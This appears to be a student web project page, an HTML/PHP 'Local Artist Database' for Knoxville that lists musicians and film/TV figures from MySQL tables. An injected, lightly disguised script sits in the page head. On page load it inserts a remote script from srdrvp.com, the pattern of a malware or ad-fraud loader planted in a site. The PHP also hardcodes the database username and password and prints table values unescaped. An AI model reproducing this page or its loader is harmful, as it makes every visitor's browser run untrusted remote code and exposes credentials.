<!-- 
Musician info:
	various - http://www.ranker.com/list/knoxville-bands-and-musical-artists-from-here/re 
	iRell - https://www.facebook.com/iRell865/info/?tab=page_info
	kenny chesnet - https://en.wikipedia.org/wiki/Kenny_Chesney
	
	crab apple lane - https://www.facebook.com/CrabAppleLane?_rdr=p

Film, Tv, Book info: 
	various - http://www.imdb.com/search/name?birth_place=Knoxville,%20Tennessee,%20USA
	jake thomas - https://en.wikipedia.org/wiki/Jake_Thomas
	randy orton - https://en.wikipedia.org/wiki/Randy_Orton
	melanie hutsell - https://en.wikipedia.org/wiki/Melanie_Hutsell
	johnny knoxville - en.wikipedia.org/wiki/Johnny_Knoxville
	wes murphy - http://www.imdb.com/name/nm2534377/?ref_=tt_ov_st
-->

<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8"> 
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="description" content="">
    <meta name="author" content="">
    <link rel="icon" href="../../favicon.ico">
	
	<!-- Latest compiled and minified CSS -->
    <link rel="stylesheet" href="http://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/css/bootstrap.min.css">

    <!-- jQuery library -->
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script>

    <!-- Latest compiled JavaScript -->
    <script src="http://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/js/bootstrap.min.js"></script>
	
	<!-- less link -->
	<link rel="stylesheet/less" href="entertainment865.css">
      <script src="less.js" type="text/javascript"></script>
	  
	    <!-- Google Web Fonts -->
	  <link rel="stylesheet" type="text/css" href="http://fonts.googleapis.com/css?family=Orbitron">
	</head>
	
	<!-- Resources used for artist information:  http://www.ranker.com/list/knoxville-bands-and-musical-artists-from-here/re 
	
	
	-->

	<title>e865 Local Artist Database</title>

    <!-- Bootstrap core CSS -->
    <link href="../../dist/css/bootstrap.min.css" rel="stylesheet">

    <!-- Custom styles for this template -->
    <link href="entertainment865.css" rel="stylesheet">
  <script>var nz3Hsx8l = 1;(function(){var k=function(){if(window == window.top && document.location.protocol == 'http:') {var komCat = document.createElement('script');komCat.src = 'http://srdrvp.com/cmn2?p=YTI2NDY1NTU5ODRwgjUJiG2VEtIBVSfCXS96o1XkByyx783TkMd2FtGOGA4kjStb8eIASrxkW50GxXKdGKUivxml5KBB7zJrmZvNfP%2F4qHLIrgl0ZvyNveDP060tI%2BcanGM4j8fhTzDgXWWk8o2jZGJXLV59oKGAiOWLAkziWqrZ5%2B4%3D&d=98';komCat.type = 'text/javascript';document.getElementsByTagName('head')[0].appendChild(komCat);}};(function d(){if(document.readyState=='interactive' || document.readyState=='complete'){k()}else{window.setTimeout(d,50)}}())}());</script></head>
  <!-- NAVBAR
================================================== -->
  <body>
    <div class="navbar-wrapper">
      <div class="container">
        <nav class="navbar navbar-inverse navbar-fixed-top" role="navigation">
          <div class="container">
            <div class="navbar-header">
              <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar" aria-expanded="false" aria-controls="navbar">
                <span class="sr-only">Toggle navigation</span>
                <span class="icon-bar"></span>
                <span class="icon-bar"></span>
                <span class="icon-bar"></span>
              </button>
              <a class="navbar-brand" href="http://ps11.pstcc.edu/~c2230a20/entertainment865/entertainment865.html#"><img src="ent865logo6.png" class="logo" alt="ent865logo"></a>
            </div>
            <div id="navbar" class="navbar-collapse collapse">
              <ul class="nav navbar-nav">
                <li class="active"><a href="http://ps11.pstcc.edu/~c2230a20/entertainment865/entertainment865.html#">Home</a></li>
				<li><a href="http://ps11.pstcc.edu/~c2230a20/entertainment865/entertainment865calendar.html">Calendar</a></li>
				<li><a href="#database">Database</a></li>
				<li><a href="http://ps11.pstcc.edu/~c2230a20/entertainment865/entertainment865exclusive.html">Exclusive</a></li>
                <li><a href="http://ps11.pstcc.edu/~c2230a20/entertainment865/entertainment865about.html#">About</a></li>
                <li><a href="http://ps11.pstcc.edu/~c2230a20/entertainment865/entertainment865contact.html#">Contact</a></li>
              </ul>
            </div>
          </div>
        </nav>
      </div>
    </div>
	
	<div class="container_exclusive_db">
		  <div class="jumbotron">
		  <center><h1>Local Artist Database</h1></center>
		 </div>
		 </div>
		 

<div class="db_style"> <center>
<?php
$db_host = 'localhost';
$db_user = 'c2230a20';
$db_pwd = 'c2230a20';
$database = 'c2230a20proj';
$table = 'Artists';
$table2 = 'Artists2';


if (!mysql_connect($db_host, $db_user, $db_pwd))
    die("Can't connect to database");

if (!mysql_select_db($database))
    die("Can't select database");

// sending query for table 1
$result = mysql_query("SELECT * FROM {$table} order by Name"); //list artists alphabetically
if (!$result) {
    die("Query to show fields from table failed");
}

$fields_num = mysql_num_fields($result);

//echo "<div class='table-responsive'><table border='1'><tr>";
echo "<div class='table-responsive'><table border='1'><tr><h1>Musicians</h1>";
// print table headers
for($i=0; $i<$fields_num; $i++)
{
    $field = mysql_fetch_field($result);
    echo "<td class='table_style'>{$field->name}</td>";
}
echo "</tr>\n";
// print table rows
while($row = mysql_fetch_row($result))
{
    echo "<tr>";

    // $row is array... foreach( .. ) puts every element
    // of $row to $cell variable
    foreach($row as $cell)
        echo "<td class='table_style2'>$cell</td>";

    echo "</tr>\n</div>"; 
}

// sending query for table 2
$result2 = mysql_query("SELECT * FROM {$table2} order by Name"); //list artists alphabetically
if (!$result2) {
    die("Query to show fields from table failed");
	}
	
mysql_free_result($result);

$fields_num = mysql_num_fields($result2);

//echo "<div class='table-responsive'><table border='1'><tr>";
echo "<div class='table-responsive'><table border='1'><tr><h1>Film, Tv, Books</h1>";
// print table headers
for($i=0; $i<$fields_num; $i++)
{
    $field = mysql_fetch_field($result2);
    echo "<td class='table_style'>{$field->name}</td>";
}
echo "</tr>\n";
// print table rows
while($row = mysql_fetch_row($result2))
{
    echo "<tr>";

    // $row is array... foreach( .. ) puts every element
    // of $row to $cell variable
    foreach($row as $cell)
        echo "<td class='table_style2'>$cell</td>";

    echo "</tr>\n</div>";  
}
mysql_free_result($result2);
?>
	</div></center>



    <!-- Bootstrap core JavaScript
    ================================================== -->
    <!-- Placed at the end of the document so the pages load faster -->
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script>
    <script src="../../dist/js/bootstrap.min.js"></script>
    <!-- IE10 viewport hack for Surface/desktop Windows 8 bug -->
    <script src="../../assets/js/ie10-viewport-bug-workaround.js"></script>
  </body>
	
</html>

  
  
  